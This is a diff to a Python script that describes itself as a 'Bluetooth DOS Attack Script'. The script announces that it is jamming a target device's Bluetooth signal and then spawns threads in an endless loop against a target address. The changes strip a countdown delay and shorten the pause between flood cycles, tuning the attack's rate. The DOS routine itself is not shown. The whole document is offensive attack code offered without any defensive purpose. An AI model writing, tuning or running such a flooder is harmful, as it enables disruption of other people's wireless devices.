@@ -10,7 +10,6 @@ def main(target_addr, packages_size, threads_count):
     print("\x1b[31m[*] Jamming target device BT signal in 3 seconds...")
     for i in range(3, 0, -1):
         print('[*] ' + str(i))
-        time.sleep(0.1)
     
     os.system('clear')
     print('[*] Building threads...\n')
@@ -19,6 +18,7 @@ def main(target_addr, packages_size, threads_count):
     while True:
         for i in range(threads_count):
             print('[*] Built thread №' + str(i + 1))
+            time.sleep(0.003)
             try:
                 threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()
             except:
@@ -27,7 +27,7 @@ def main(target_addr, packages_size, threads_count):
         print('[*] Built all threads...')
         print('[*] Starting...')
         
-        time.sleep(0.1)  # Pausa de 1 segundo antes de reiniciar o loop
+        time.sleep(0.01)  # Pausa de 0.01 segundo antes de reiniciar o loop
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description='Bluetooth DOS Attack Script')
